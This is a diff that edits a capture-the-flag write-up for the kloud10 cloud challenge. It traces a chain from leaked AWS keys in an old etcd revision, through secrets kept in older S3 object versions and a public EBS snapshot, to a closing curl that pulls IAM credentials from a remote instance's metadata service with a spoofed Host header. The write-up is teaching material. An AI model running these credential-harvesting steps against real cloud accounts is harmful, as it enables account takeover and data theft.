@@ -2,13 +2,13 @@
 title: "PwnSec-CTF 2k24"
 date: 2024-11-17
 draft: false
-description: "writeup for kloud10 chall"
+description: "How a leaked etcd backup, an old S3 object version, and a public EBS snapshot chain into full account takeover in the kloud10 challenge"
 tags: ["ctf", "security", "helm", "aws", "pentest"]
 aliases: ["/writeups/1733675908443-PwnSec-CTF-2k24/"]
 ---
 
 {{< button href="https://ctf.pwnsec.xyz/" target="_self" >}}
-Click here to vist PwnSec 2k24{{< /button >}}
+Click here to visit PwnSec 2k24{{< /button >}}
 
 
 ### Info;
@@ -26,39 +26,39 @@ Click here to vist PwnSec 2k24{{< /button >}}
 
 ### Solution:
 
-#### Part I: Getting the AWS Creds from ETCD;
-you are first given a `zip` file called `kloud-10` after unzipping the file you will find a file called `db` this file is an etcd backup file in order to deal with it you need to have etcd install in order to deal with it:
+#### Part I: Getting the AWS creds from etcd;
+You're handed a zip file called `kloud-10`. Unzip it and there's a file called `db`: an etcd backup. Reading it means having `etcdctl` installed locally.
 
-first you need to run the following:
+Start with:
 
 ```shell
 etcdctl get / --prefix
 ```
 
-This command retrieves all key-value pairs stored in etcd that start with /. The --prefix option specifies that the query should return all entries whose key starts with the specified path /. The output includes various configuration settings related to an application.
+This dumps every key-value pair under the root path. The `--prefix` flag tells it to match anything starting with `/`, and what comes back is a pile of application config.
 
 ![etcdctl output](image.png)
 
 #### Part II: Enumerating the AWS account;
-we notice a list of keys with a wide range of options and values, if we go through them will notice one with the name `/cloud10/config/aws`
+Scrolling through the dump turns up a key worth stopping on: `/cloud10/config/aws`.
 
-it does include include information about a bucket name and the region the bucket is in.
+It holds a bucket name and the region it lives in.
 
-now if we go with the rest of the keys we will find another one related to aws 
-`/cloud10/secrets/aws-creds` 
+Further down the list, another AWS-related key shows up:
+`/cloud10/secrets/aws-creds`
 
-of we tried to examine it we will notice its empty, but if added an option to our command to retrieve an older version we will get the following output:
+Read it directly and it's empty. Ask etcd for an older revision instead, and this comes back:
 
 ![etcdctl output 2](image2.png)
 
-as we can see the output included AWS access keys, lets configure them and see what we can do with these creds:
+There they are: real AWS access keys. Time to configure them and see what they unlock:
 
 ```shell
 aws configure
 ```
 ![etcdctl output 2](image3.png)
 
-lets check the identity of the user we are dealing with:
+First move, always: check who we actually are.
 
 ```shell
 aws sts get-caller-identity 
@@ -66,21 +66,21 @@ aws sts get-caller-identity
 
 ![aws user identity](image4.png)
 
-based on the output of the previous command the name of the user we are dealing with is called `Freya` now lets see what user `Freya` can do:
+The identity comes back as `Freya`. Next question: what can Freya actually do?
 
-first thing is to check for any attached user polices:
+Start with attached managed policies:
 
 ```shell
 aws list-attached-user-policies --user-name Freya 
 ```
 ![error ](image5.png)
 
-as we can notice user `Freya` does not have permission to list attached managed policies, lucky there are two types of polices in aws `inline` and  `managed`
+No permission to list attached managed policies. Dead end, but not the only door — AWS splits policies into two types: `inline` and `managed`.
 
-you can read more about here:
+More on the distinction here:
 [Managed policies and inline policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)
 
-now based on this lets check if user `Freya` can list inline polices:
+So: can Freya list inline policies instead?
 
 ```shell 
 aws iam list-user-policies --user-name Freya 
@@ -88,7 +88,7 @@ aws iam list-user-policies --user-name Freya
 
 ![inline policy name ](image6.png)
 
-as we can see, user `Freya` has a policy with the name `FreyaBoundPolicy` lets try to get the policy and see whats inside:
+She does: `FreyaBoundPolicy`. Let's pull it and see what's inside:
 
 ```shell
 aws iam get-user-policy --user-name Freya --policy-name FreyaBoundPolicy | jq
@@ -96,18 +96,18 @@ aws iam get-user-policy --user-name Freya --policy-name FreyaBoundPolicy | jq
 
 ![get policy ](image7.png)
 
-as we can notice user `Freya` has access to two buckets :
+Freya has access to two buckets:
 1. vanaheim55 
 2. midgard55
 
-lets try to list the contents of of bucket `vanaheim55`:
+Start with `vanaheim55`:
 
 ```shell
 aws s3 ls s3://vanaheim55
 ```
 ![vanaheim55](image8.png)
 
-Jackpot we found the flag lets get it:
+There's the flag. Grab it:
 
 ```shell
 aws s3 cp s3://vanaheim55/flag.txt .
@@ -118,37 +118,36 @@ aws s3 cp s3://vanaheim55/flag.txt .
 
 ![not so fast](not-so-fast.gif)
 
-if we notice the policy again we will see that the user `Freya` is not allowed to get objects from s3 bucket but she only can list objects :((
+Check the policy again and there's the catch: Freya can list objects, not get them.
 
-therefore lets check bucket `midgard55`:
+On to `midgard55`, then:
 
 ```shell
 aws s3 ls s3://midgard55
 ```
-#### Part III: Retreiving the second iam creds from the helm chat;
+#### Part III: Retrieving the second IAM creds from the helm chart;
 ![midgard55 objects](image-3.png)
 
-as it can be observed from the policy that user `Freya` can list objects and get objects from bucket `midgard55` in addition she can list versions of objects indicating that s3 bucket versioning is enabled for bucket `midgard55` lets start checking these files and what they are:
+The policy shows Freya can list *and* get objects in `midgard55`, plus list object versions — which means S3 versioning is on for this bucket. Worth digging through.
 
-based on the structure of the objects we can notice that these files are for a `helm chart`
+The file layout gives it away fast: this is a Helm chart.
 
 {{< alert " " >}}
 **Helm chart?** Helm charts are a collection of files that describe a Kubernetes cluster's resources and package them together as an application
 {{< /alert >}}
 
-for more info check: {{< button href="(https://helm.sh/" target="_self" >}}
+for more info check: {{< button href="https://helm.sh/" target="_self" >}}
 helm.sh
 {{< /button >}}
 
-now since we have a better understanding of what we are dealing with we have two options:
+Two ways to go from here:
 
-1. get all files of the chart and try to install the helm chart to a k8s cluster of our own
-2. check manually for any interesting stuff within the files
+1. Pull the whole chart and install it on a k8s cluster of our own
+2. Go through the files by hand
 
+For this writeup, option two.
 
-for the purpose of the writeup lets stick with second option.
-
-lets copy everything within the bucket:
+Sync the whole bucket down:
 
 ```shell 
 aws s3 sync s3://midgard55 .
@@ -156,27 +155,27 @@ aws s3 sync s3://midgard55 .
 
 ![get midgard55 bucket objects](image-4.png)
 
-now lets start looking for anything useful:
+Now the hunt for anything useful starts.
 
-starting with `Chart.yaml`:
+First, `Chart.yaml`:
 
 ![](image-5.png)
 
-nothing so much useful
+Nothing worth stopping for.
 
-lets check `values.yaml`
+Next, `values.yaml`.
 
 ![](image-6.png)
 
-still nothing lets jump inside `templates` directory:
+Still nothing. Into the `templates` directory:
 
 ![](image-7.png)
 
-lest check `NOTES.txt`:
+Then `NOTES.txt`:
 
 ![](image-8.png)
 
-as we can see there is a message about some exposed secrets by an intern, we know that the bucket has s3 versioning enabled so it means maybe something was within this file before lets check that:
+There's a note about secrets an intern exposed. Since versioning is on, an earlier revision of this file might still have them — worth checking.
 
 ```shell
 aws s3api list-object-versions --bucket midgard55
@@ -184,7 +183,7 @@ aws s3api list-object-versions --bucket midgard55
 
 ![](image-9.png)
 
-as it can be observed there is a previous version of `NOTES.txt` lets get the old one and see whats inside:
+Sure enough, there's an older version of `NOTES.txt`. Pull it:
 
 ```shell
 aws s3api get-object --bucket midgard55 --key 'templates/NOTES.txt' --version-id B8lWaRH7dB_ymDyICm_NAsBVO_qNpDfQ old_NOTES.txt
@@ -192,13 +191,11 @@ aws s3api get-object --bucket midgard55 --key 'templates/NOTES.txt' --version-id
 
 ![alt text](image-10.png)
 
-there are a bunch of notes related to the helm chart, lets focus on the second note, there is a snapshot id
+A handful of notes about the chart, but the second one matters: a snapshot ID. Hang onto that.
 
-lets keep this for later
+On to the rest of the files.
 
-now lets check other files
-
-` VolumeSnapshotContent.yml`:
+`VolumeSnapshotContent.yml`:
 
 ```yaml
 apiVersion: snapshot.storage.k8s.io/v1
@@ -217,11 +214,11 @@ spec:
   volumeSnapshotClassName: csi-aws-vsc
   ```
 
-  as we can see there are nothing useful here too 
+Nothing useful here either.
 
-  lets check other files:
+Next file:
 
-` serviceaccount.yaml`:
+`serviceaccount.yaml`:
 
 ```yaml
 {{- if .Values.serviceAccount.create -}}
@@ -239,7 +236,7 @@ automountServiceAccountToken: {{ .Values.serviceAccount.automount }}
 {{- end }}
 ```
 
-nope again lets check `_helpers.tpl`:
+Nothing again. Then `_helpers.tpl`:
 
 ```yaml
 {{/*
@@ -314,7 +311,7 @@ Create the name of the service account to use
 {{- end }}
 ```
 
-as we can see there are REDACTED aws creds indicating that there were aws access keys here before lets use aws s3 versioning to get them back:
+The AWS creds here are redacted, which means real keys existed in an earlier version. Same trick as before: pull an older revision.
 
 ![](image-11.png)
 
@@ -324,22 +321,22 @@ aws s3api get-object --bucket midgard55 --key 'templates/_helpers.tpl' --version
 
 ![](image-12.png)
 
-BINGO we found new aws access keys, lets configure them 
+Bingo. Fresh AWS access keys. Configure them:
 
 ```shell
 aws configure
 ```
 #### Part IV: Enumerating the second AWS account;
-lets check the identity of the new user 
+Check who this new identity actually is:
 
 ```shell
 aws sts get-caller-identity
 ```
 ![](image-13.png)
 
-we have a new user called `Mimir`
+This one's `Mimir`.
 
-lets check if it does have any policies attached:
+Same policy check as before:
 
 
 ```shell
@@ -348,14 +345,14 @@ aws iam list-attached-user-policies --user-name Mimir
 aws iam list-user-policies --user-name Mimir
 ```
 
-both of the previous commands fails to show us anything indicating that user `Mimir` does not have any permission to list policies.
+Both commands come back empty. Mimir doesn't have permission to list policies either.
 
-in this case we could use an enumeration tool like
+Worth trying an enumeration tool at this point, like
 [aws-enumerator](https://github.com/shabarkin/aws-enumerator?tab=readme-ov-file) 
 
-but it fails too, and nothing was available.
+That fails too. Nothing available.
 
-If we recall we found a snapshot ID lets try and see if we can list its attributes
+That snapshot ID from earlier, though — let's check its attributes.
 
 ```shell
  aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-019f040d**********
@@ -363,17 +360,15 @@ If we recall we found a snapshot ID lets try and see if we can list its attribut
 
  ![](image-14.png)
 
-#### Part V: Creating a new EC2 instance based on the snapshot-id;
-first lets understand what we did:
+#### Part V: Creating a new EC2 instance based on the snapshot ID;
+Quick recap of the plan here.
 
-* since we got a snapshot id we should check if its public or not by describing its `createVolumePermission` attribute cause this attribute is responsible if any aws account can create volumes from this snapshot or not and since it does have the value of `all` then you can create any aws account, and search for the snapshot ID, then create an `ebs` volume from this snapshot then create an `ec2` instance and attach the newly created volume from the snapshot to the ec2 instance and see if there is anything we can take advantage of.
+With a snapshot ID in hand, the first thing to check is whether it's public. The `createVolumePermission` attribute controls exactly that: whether other AWS accounts can create volumes from this snapshot. It comes back as `all`, meaning any AWS account can grab it. So: create a volume from the snapshot, attach it to a fresh EC2 instance, and see what's on disk.
 
-
-after doing so you will start looking for any useful files 
-one that outstand from the other is this file:
+Once the volume's attached, it's time to go looking for anything interesting. One file stands out immediately:
 `/etc/systemd/system/aws-configure.service`
 
-lets check it 
+Contents:
 
 ```bash
 [Unit]
@@ -392,14 +387,11 @@ WorkingDirectory=/home
 WantedBy=multi-user.target
 ```
 
-we notice that this is a custom service that connects to an `ec2` instance 
-with a specific ip address.
+A custom systemd service that connects out to a specific EC2 instance by IP.
 
+Pinging that IP goes nowhere, but it's the only lead available. So instead, try pulling its instance metadata.
 
-if we tried to ping the machine it will fail, but since this is the only info we have about it lets try to get its meta data :
-
-
-in order to do so we need to specify the host IP address which is 
+That means pointing requests at the metadata service address:
 `169.254.169.254`
 
 <blockquote >
@@ -411,6 +403,8 @@ Of particular note, 169.254.169.254 is used in AWS, Azure, GCP and other cloud c
 </blockquote>
 
 #### Part VI: Getting the flag;
+
+From here it's a straight run to the flag:
 
 ```shell
 curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
